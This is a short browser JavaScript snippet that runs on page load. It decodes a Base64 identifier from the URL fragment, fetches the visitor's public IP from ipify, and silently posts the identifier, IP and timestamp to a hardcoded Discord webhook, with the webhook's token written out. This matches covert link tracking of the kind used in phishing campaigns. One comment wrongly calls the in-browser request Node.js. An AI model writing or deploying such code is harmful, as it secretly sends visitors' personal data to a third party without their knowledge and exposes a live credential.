window.addEventListener('DOMContentLoaded', () => {
    const encodedData = window.location.hash.substr(1); // Extract the encoded data from the URL hash
    const decodedData = atob(encodedData); // Decode the Base64 data

    // Fetch the user's IP address
    fetch('https://api.ipify.org/?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip; // Extract the IP address from the response

            const time = new Date().toLocaleString(); // Get the current time

            const content = `${decodedData} has registered in from ${ipAddress} at ${time}`;

            // Send the content to the Discord webhook using Node.js
            const webhookURL = 'https://discord.com/api/webhooks/1108236712540373043/DdvGGMXm6Q-oEWFdSGxqERbuMJbHH-E332S1VANmtc8EpHQTqYpWaz2ztP7sqFxBOaEv';
            const payload = JSON.stringify({ content });

            const xhr = new XMLHttpRequest();
            xhr.open('POST', webhookURL, true);
            xhr.setRequestHeader('Content-type', 'application/json');
            xhr.send(payload);
        })
        .catch(error => console.error('Error:', error));
});